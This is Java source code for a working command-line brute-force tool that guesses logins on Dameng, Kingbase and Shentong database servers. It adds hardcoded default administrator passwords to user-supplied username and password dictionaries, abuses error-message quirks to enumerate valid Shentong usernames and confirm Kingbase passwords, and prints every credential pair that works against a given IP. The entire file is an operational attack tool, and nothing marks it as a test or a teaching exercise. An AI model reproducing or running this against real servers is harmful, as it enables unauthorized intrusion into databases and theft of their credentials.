package cn.brute.db;

import org.apache.commons.cli.*;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.SocketTimeoutException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.*;

public class Main {

    public static void main(String[] args) {
        try {
            HashMap<String, String[]> dbmsMap = new HashMap<>();
            dbmsMap.put("dm", new String[]{"dm.jdbc.driver.DmDriver", "dm", "达梦数据库", "5236"});
            dbmsMap.put("jc", new String[]{"com.kingbase.Driver", "kingbase", "人大金仓数据库", "54321"});
            dbmsMap.put("jc8", new String[]{"com.kingbase8.Driver", "kingbase8", "人大金仓v8数据库", "54321"});
            dbmsMap.put("st", new String[]{"com.oscar.Driver", "oscar", "神通数据库", "2003"});

            HashMap<String, String[][]> defaultPasswords = new HashMap<>();
            defaultPasswords.put("dm", new String[][]{{"SYSDBA", "SYSAUDITOR"}, {"SYSDBA", "SYSAUDITOR"}});
            defaultPasswords.put("jc", new String[][]{{"SYSTEM", "root"}, {"SYSTEM"}});
            defaultPasswords.put("jc8", new String[][]{{"SYSTEM", "root"}, {"SYSTEM"}});
            defaultPasswords.put("st", new String[][]{{"SYSDBA", "SYSSECURE"}, {"szoscar55"}});

            Options options = new Options();
            options.addOption("dbms", true, "可选项: dm - 达梦; jc - 人大金仓; jc8 - 人大金仓v8; st - 神通");
            options.addOption("uf", true, "用户名字典，不指定则使用当前目录下的user.txt文件");
            options.addOption("pf", true, "密码字典，不指定则使用当前目录下的password.txt文件");
            options.addOption("h", true, "服务器IP");
            options.addOption("p", true, "端口，不指定则使用默认端口");
            options.addOption("i", true, "爆破间隔时长，默认为0，单位：毫秒");
            options.addOption("debug", false, "调试模式，会打印异常");
            HelpFormatter formatter = new HelpFormatter();
            if (args.length < 2) {
                formatter.printHelp("java -jar BruteCNDB.jar -dbms dm -h 10.0.0.1 [-p 5236] [-uf user.txt] [-pf password.txt]", options);
                System.exit(1);
            }
            CommandLineParser parser = new DefaultParser();
            CommandLine cmd;
            cmd = parser.parse(options, args);

            String dbms = cmd.getOptionValue("dbms");
            String port = cmd.hasOption("p") ? cmd.getOptionValue("p") : dbmsMap.get(dbms)[3];
            String host = cmd.getOptionValue("h");
            int interval = 0;
            if (cmd.hasOption("i")) interval = Integer.parseInt(cmd.getOptionValue("i"));

            Class.forName(dbmsMap.get(dbms)[0]);
            String url = String.format("jdbc:%s://%s:%s/", dbmsMap.get(dbms)[1], host, port);

            LinkedHashSet<String> userDict = new LinkedHashSet<>();
            LinkedHashSet<String> pwdDict = new LinkedHashSet<>();
            try {
                userDict = getListFromFile(cmd.hasOption("uf") ? cmd.getOptionValue("uf") : "user.txt");
                pwdDict = getListFromFile(cmd.hasOption("pf") ? cmd.getOptionValue("pf") : "password.txt");
            } catch (IOException e) {
                e.printStackTrace();
            }
            userDict.addAll(Arrays.asList(defaultPasswords.get(dbms)[0]));
            pwdDict.addAll(Arrays.asList(defaultPasswords.get(dbms)[1]));

            int total = userDict.size() * pwdDict.size();
            int index = 1;
            HashMap<String, String> availbleUserPasswords = new HashMap<>();
            System.out.println(String.format("开始爆破%s！由于是单线程，速度会比较慢....", dbmsMap.get(dbms)[2]));
            Iterator<String> pwdIterator = pwdDict.iterator();  // 由于神通数据库的原因，必须要用Iterator循环而不是ForEach
            while (pwdIterator.hasNext()) {
                String pwd = pwdIterator.next();
                Iterator<String> userIterator = userDict.iterator();
                while (userIterator.hasNext())  {
                    String user = userIterator.next();
                    try {
                        // 简单粗暴的百分比判断，复制粘贴就完事儿
                        Connection connection = DriverManager.getConnection(url, user, pwd);
                        if (index == total * 0.1 || index == total * 0.2 || index == total * 0.3 || index == total * 0.4 || index == total * 0.5 || index == total * 0.6 || index == total * 0.7 || index == total * 0.8 || index == total * 0.9)
                            System.out.println(String.format("进度：%d%%", index * 100 / total));
                        index += 1;
                        System.out.println(String.format("[!] Username: %s, password: %s", user, pwd));
                        connection.close();
                        availbleUserPasswords.put(user, pwd);
                    } catch (SQLException e) {
                        if (e.getCause() instanceof SocketTimeoutException) {
                            System.out.println("[x] Socket连接超时");
                        } else if (e.getMessage().contains("不存在") && dbms.contains("jc")) {
                            // 金仓数据库密码正确但数据库名错误时会提示"xxx"数据库不存在
                            System.out.println(String.format("[!] Username: %s, password: %s", user, pwd));
                            availbleUserPasswords.put(user, pwd);
                        } else if (e.getMessage().contains("timed out") && dbms.equals("st")) {
                            // 神通数据库连接超时会报OSSQLException异常而不是java默认的SocketTimeoutException
                            System.out.println("[x] 连接神通数据库超时");
                        } else if (e.getMessage().contains("用户") && e.getMessage().contains("不存在") && dbms.equals("st")) {
                            /* 神通数据库可以枚举用户名，用户名不存在时异常信息中会有提示，
                            使用Iterator循环可以在检测到用户名不存在时将其从用户名列表中剔除，避免做无用功，
                            而ForEach循环就不能直接删除集合中的元素 */
                             userIterator.remove();
                             userDict.remove(user);
                        } else if (cmd.hasOption("debug")) {
                            e.printStackTrace();
                        }
                    }
                    Thread.sleep(interval);
                }
            }
            if (availbleUserPasswords.isEmpty()) System.out.println("不好意思，没爆出来。。。");
            else {
                System.out.println("所有爆破成功的用户名和密码：");
                availbleUserPasswords.forEach((user, pwd) -> {
                    System.out.println("Username: " + user + "\tPassword:" + pwd);
                });
            }

        } catch (ParseException | InterruptedException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            System.out.println("缺少对应数据库的JDBC驱动");
            e.printStackTrace();
        }
    }

    public static LinkedHashSet<String> getListFromFile(String filename) throws IOException {
        FileInputStream fis = new FileInputStream(filename);
        BufferedReader br = new BufferedReader(new InputStreamReader(fis));
        String line;
        LinkedHashSet<String> lines = new LinkedHashSet<>();
        while ((line = br.readLine()) != null) {
            lines.add(line.strip());
        }
        br.close();
        fis.close();
        return lines;
    }
}
